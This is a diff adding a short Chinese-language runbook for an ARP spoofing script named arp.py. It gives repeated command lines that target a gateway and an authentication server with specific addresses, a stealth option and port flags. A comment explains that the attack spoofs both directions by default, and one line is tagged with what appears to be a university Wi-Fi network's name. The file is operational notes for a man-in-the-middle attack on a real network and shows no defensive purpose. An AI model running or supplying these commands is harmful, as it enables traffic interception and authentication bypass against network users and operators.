@@ -1,0 +1,29 @@
+ulimit -n 65535提高会话允许打开线程上限
+
+ip a
+ip r  获取 --gateway [你的网关IP] --server [目标服务器ip]
+
+
+sudo python3 你的脚本文件名.py --gateway [你的网关IP] --server [目标服务器ip] --iface [网卡名] --模式（stealth）
+
+
+
+sudo python3 your_script_name.py --gateway 10.17.0.1 --server 121.248.150.37 --iface eth0 --stealth
+sudo python3 arp.py --gateway 10.17.0.1 --server 121.248.150.37 --iface wlan0 --stealth
+sudo python3 arp.py --gateway 10.17.0.1 --server 121.248.150.37 --iface wlan0 --stealth --timeout 90  加入线程生命周期
+sudo python3 arp.py --gateway 10.17.0.1 --server 121.248.150.37 --port 801 --iface wlan0 --stealth --timeout 90  加入监测端口号
+
+sudo python3 arp.py --gateway 10.15.0.1 --server 10.11.2.3 --port 80 --iface wlan0 --stealth --timeout 90
+
+*atack默认双向欺骗去掉--stealth就好了，要隐秘牺牲成功率就加--stealth
+--------------------------------
+修改代码
+
+nano 1.py                 粘贴完整迭代版本
+mv -f 1.py arp.py      意思:用1替换arp，并删掉1
+---------------------------
+用这个
+cd ~/文档/projects/arp/  &&  ulimit -n 65535
+ulimit -n 65535
+sudo python3 arp.py --gateway 10.17.0.1 --server 121.248.150.37 --port 801 --auth-server 121.248.150.37 --auth-port 801 --iface wlan0 --timeout 90     NJFU-WiFi
+sudo python3 arp.py --gateway 10.15.0.1 --auth-server 10.11.2.3 --auth-port 80 --iface wlan0 --timeout 90                   @f-Young不可用
